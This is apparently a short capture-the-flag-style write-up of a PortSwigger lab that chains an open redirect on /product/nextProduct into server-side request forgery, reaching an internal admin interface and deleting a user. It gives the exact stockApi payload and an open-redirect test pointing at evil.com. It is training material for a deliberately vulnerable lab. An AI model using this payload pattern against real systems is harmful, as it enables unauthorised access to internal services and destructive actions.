# Lab: SSRF with filter bypass via open redirection vulnerability (Practitioner)

**Lab:** [https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)

**Task (from PortSwigger):**  
This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at `http://192.168.0.12:8080/admin` and delete the user `carlos`.

The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first.

## Vulnerability
`stockApi` only allows same-host URLs. Open redirect on `/product/nextProduct?path=` is followed by the stock checker → pivot to internal admin.

## Solution

1. Confirm open redirect: `/product/nextProduct?path=http://evil.com` → Location: evil.com.
2. Feed redirect into stockApi:

```
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

Stock checker requests the path on the allowed host, follows the redirect to the internal admin delete URL.

## Final Payload
```
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```
